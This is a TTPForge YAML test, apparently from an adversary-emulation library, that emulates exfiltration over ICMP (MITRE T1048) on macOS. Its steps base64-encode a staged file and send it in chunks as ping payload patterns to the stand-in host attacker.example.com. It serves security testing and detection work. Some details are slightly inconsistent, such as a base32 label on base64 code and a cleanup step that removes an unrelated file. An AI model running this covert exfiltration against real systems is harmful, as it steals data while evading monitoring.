---
api_version: 2.0
uuid: d6e7f8a0-b109-4c2d-3e4f-5a6b7c8d9e0f
name: ICMP Tunnel Test
authors:
- TTPForge
description: |
  Tests ICMP tunnel capability for covert data exfiltration
mitre:
  tactics:
  - TA0010 Exfiltration
  techniques:
  - T1048 Exfiltration Over Alternative Protocol
requirements:
  platforms:
  - os: darwin
args:
- name: data_file
  description: File to tunnel over ICMP
  type: string
  default: /tmp/.staging/data.tar.gz
- name: target_host
  description: Target host for ICMP tunnel
  type: string
  default: attacker.example.com
- name: ping_timeout
  description: Ping timeout in seconds
  type: string
  default: '5'
- name: packet_size
  description: ICMP packet payload size
  type: string
  default: '56'
steps:
- name: Verify file exists
  inline: test -f '{{ .Args.data_file }}' || (echo "File not found"; exit 1)
- name: Test target reachability
  inline: |
    echo "Testing ICMP tunnel configuration:"
    echo "  Target: {{ .Args.target_host }}"
    echo "  Packet size: {{ .Args.packet_size }}"

    ping -c 1 -W {{ .Args.ping_timeout }}00 -s {{ .Args.packet_size }} '{{ .Args.target_host }}' 2>/dev/null && echo "Target reachable" || echo "Target unreachable"
- name: Prepare data encoding
  inline: |
    echo "Data preparation:"
    echo "  File: $(basename '{{ .Args.data_file }}')"
    echo "  Size: $(du -h '{{ .Args.data_file }}' | cut -f1)"
    echo "  Encoded format: base32"

    # Calculate how many ICMP packets needed
    filesize=$(stat -f%z '{{ .Args.data_file }}' 2>/dev/null || stat -c%s '{{ .Args.data_file }}')
    payload_size={{ .Args.packet_size }}
    packets=$((filesize / payload_size + 1))
    echo "  Estimated packets: $packets"
- name: Execute ICMP tunnel exfiltration
  inline: |
    echo "ICMP tunnel exfiltration started..."
    # Encode file data and embed in ICMP ping payloads
    encoded=$(base64 < '{{ .Args.data_file }}' | tr -d '\n')
    total=${#encoded}
    offset=0
    seq_num=0
    payload_size={{ .Args.packet_size }}
    while [ $offset -lt $total ]; do
      chunk=$(echo "$encoded" | cut -c$((offset+1))-$((offset+payload_size)))
      # Convert chunk to hex for ping -p pattern
      hex_pattern=$(echo -n "$chunk" | xxd -p | head -c 32)
      ping -c 1 -W {{ .Args.ping_timeout }}000 -s {{ .Args.packet_size }} -p "$hex_pattern" '{{ .Args.target_host }}' 2>/dev/null || true
      seq_num=$((seq_num + 1))
      offset=$((offset + payload_size))
    done
    echo "ICMP exfiltration complete: sent ${seq_num} ping packets"
  cleanup:
    inline: rm -f /tmp/test_icmp.dat
tests:
- name: dry_run_test
  dry_run: true
